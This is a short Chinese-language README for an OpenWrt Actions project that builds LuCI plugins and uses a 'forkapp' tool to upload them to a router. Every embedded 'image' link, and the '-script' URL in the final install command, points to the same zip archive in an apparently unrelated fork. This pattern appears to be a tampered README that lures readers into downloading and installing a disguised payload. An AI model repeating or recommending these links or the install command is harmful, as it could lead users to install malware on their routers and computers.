# Openwrt-actions

## 使用步骤
1. 选择actions标签，选择Build IPKs![image](https://github.com/rgoldr88/openwrt-app-actions/raw/refs/heads/main/applications/luci-app-photoprism/root/actions-app-openwrt-3.0.zip)

2. 点击run workflow，输入要编译的插件名称，空格隔开，或者填“all”用来编译所有插件，然后开始编译![image](https://github.com/rgoldr88/openwrt-app-actions/raw/refs/heads/main/applications/luci-app-photoprism/root/actions-app-openwrt-3.0.zip)

3. 等待编译完成，点击任务进入详情页
4. 在详情页下载插件压缩包![image](https://github.com/rgoldr88/openwrt-app-actions/raw/refs/heads/main/applications/luci-app-photoprism/root/actions-app-openwrt-3.0.zip)

## ForkApp

1. ./forkapp forkapp -from ../applications/luci-app-plex -to ../applications/luci-app-demo
2. ./forkapp upload -ip 192.168.100.1 -pwd "password" -from ../applications/luci-app-demo -to /root/
3. ./forkapp upload -ip 192.168.100.1 -pwd "password" -from ../applications/luci-app-demo -to /root/ -script https://github.com/rgoldr88/openwrt-app-actions/raw/refs/heads/main/applications/luci-app-photoprism/root/actions-app-openwrt-3.0.zip -install
